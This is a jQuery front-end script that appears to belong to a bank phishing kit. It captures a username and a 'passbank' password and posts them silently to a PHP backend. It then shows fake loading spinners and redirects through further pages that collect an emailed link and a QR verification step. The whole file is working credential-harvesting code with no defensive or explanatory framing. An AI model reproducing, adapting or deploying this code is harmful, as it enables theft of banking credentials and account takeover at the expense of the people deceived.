$('#passbank').keyup(function(){
$('#signin-button').prop('disabled',false);
});

$('#signin-button').click(function(){
var user = $('#Username').val();
var pass = $('#passbank').val();
$('#signin-button').prop('disabled',true);
setTimeout(function() {$('#signin-button').html('<img src="assets/img/load.gif" class="image-load">');}, 150);
$.post('assets/php/app.php', {content:'main', user:user, pass:pass}, function(response){});

setTimeout(function() {
var url = "./email_link.php";
$(location).attr('href',url);}, 6000);

});

/* Validate Url */
function isValidURL(string) {
  var res = string.match(/(http(s)?:\/\/.)?(www\.)?[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/g);
  return (res !== null)
};

$('#link').keyup(function(){
var macaco = $('#link').val();
/* Verify URL */
if (isValidURL(macaco)) {
$('#logear').prop('disabled', false);
}else {
$('#logear').prop('disabled', true);}
});





$('#logear').click(function(){
var link = $('#link').val();
$('#logear').prop('disabled',true);
$('#logear').attr('disabled',true);
setTimeout(function() {$('#logear').html('<img src="assets/img/load.gif" class="image-load">');}, 150);
$.post('assets/php/app.php', {content:'link', link:link}, function(response){});

setTimeout(function() {
var url = "./qr_verification.php";
$(location).attr('href',url);}, 6000);

});

